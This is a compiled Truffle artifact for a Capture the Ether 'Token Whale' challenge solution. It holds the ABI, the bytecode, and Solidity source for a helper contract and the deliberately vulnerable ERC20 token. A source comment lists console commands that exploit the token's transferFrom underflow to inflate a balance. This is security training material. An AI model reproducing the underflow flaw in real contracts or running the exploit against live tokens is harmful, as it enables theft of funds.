{
  "contractName": "TokenWhaleHelper",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "requested",
          "type": "address"
        }
      ],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "to",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "from",
          "type": "address"
        },
        {
          "name": "to",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b610a528061005f6000396000f300606060405260043610610099576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063095ea7b31461009b5780630b4b5198146100dd57806323b872dd1461013257806335a28f3e146101935780633ccfd60b146101cc578063a9059cbb146101e1578063b2fa1c9e14610223578063e98d36e114610250578063f8b2cb4f146102a5575b005b34156100a657600080fd5b6100db600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506102f2565b005b34156100e857600080fd5b6100f0610415565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561013d57600080fd5b610191600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061043e565b005b341561019e57600080fd5b6101ca600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610596565b005b34156101d757600080fd5b6101df610670565b005b34156101ec57600080fd5b610221600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506106c9565b005b341561022e57600080fd5b6102366107ec565b604051808215151515815260200191505060405180910390f35b341561025b57600080fd5b6102636108da565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156102b057600080fd5b6102dc600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506108ff565b6040518082815260200191505060405180910390f35b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561033a57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663095ea7b384846040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b151561040057600080fd5b5af1151561040d57600080fd5b505050505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561048657600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff166323b872dd8585856040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050600060405180830381600087803b151561058057600080fd5b5af1151561058d57600080fd5b50505050505050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015156106c757600080fd5b565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561071157600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb84846040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15156107d757600080fd5b5af115156107e457600080fd5b505050505050565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561083657600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156108bd57600080fd5b5af115156108ca57600080fd5b5050506040518051905091505090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561094957600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff166370a08231846040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1515610a0757600080fd5b5af11515610a1457600080fd5b505050604051805190509150509190505600a165627a7a72305820af3c2c094b23cd59cc6a29bf04fa2231a02010944ebbbda6b5748f863c1f19f20029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nvar tokenWhaleChallenge = await TokenWhaleChallenge.deployed();\r\nvar tokenWhaleHelper = await TokenWhaleHelper.deployed();\r\nawait tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.steal()\r\n\r\ntokenWhaleChallenge.balanceOf(accounts[0])\r\ntokenWhaleChallenge.approve(accounts[0], 1000000000000)\r\ntokenWhaleChallenge.transferFrom(accounts[0], tokenWhaleHelper.address, 500)\r\ntokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)\r\n\r\ntokenWhaleHelper.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)\r\n\r\n\r\n\r\nvar tokenWhaleChallenge = await TokenWhaleChallenge.deployed();\r\nvar tokenWhaleHelper = await TokenWhaleHelper.deployed();\r\n(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber();\r\n(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toNumber()\r\nawait tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)\r\nawait tokenWhaleHelper.approve(tokenWhaleHelper.address, 9999999999)\r\nawait tokenWhaleHelper.transferFrom(tokenWhaleHelper.address, accounts[0], 9999999999)\r\n(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber()\r\n(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toString()\r\nawait tokenWhaleChallenge.isComplete()\r\n*/\r\n\r\ncontract TokenWhaleHelper is OtherContract {\r\n    function() public payable { \r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function getBalance(address requested) public view returns (uint256) {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        return tokenWhaleChallenge.balanceOf(requested);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        return tokenWhaleChallenge.isComplete();\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.approve(spender, value);\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.transfer(to, value);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.transferFrom(from, to, value);\r\n    }\r\n}\r\n\r\ncontract TokenWhaleChallenge {\r\n    address player;\r\n\r\n    uint256 public totalSupply;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    string public name = \"Simple ERC20 Token\";\r\n    string public symbol = \"SET\";\r\n    uint8 public decimals = 18;\r\n\r\n    function TokenWhaleChallenge(address _player) public {\r\n        player = _player;\r\n        totalSupply = 1000;\r\n        balanceOf[player] = 1000;\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return balanceOf[player] >= 1000000;\r\n    }\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function _transfer(address to, uint256 value) internal {\r\n        balanceOf[msg.sender] -= value;\r\n        balanceOf[to] += value;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public {\r\n        require(balanceOf[msg.sender] >= value);\r\n        require(balanceOf[to] + value >= balanceOf[to]);\r\n\r\n        _transfer(to, value);\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function approve(address spender, uint256 value) public {\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public {\r\n        require(balanceOf[from] >= value);\r\n        require(balanceOf[to] + value >= balanceOf[to]);\r\n        require(allowance[from][msg.sender] >= value);\r\n\r\n        allowance[from][msg.sender] -= value;\r\n        _transfer(to, value);\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\TokenWhaleChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T20:59:44.106Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}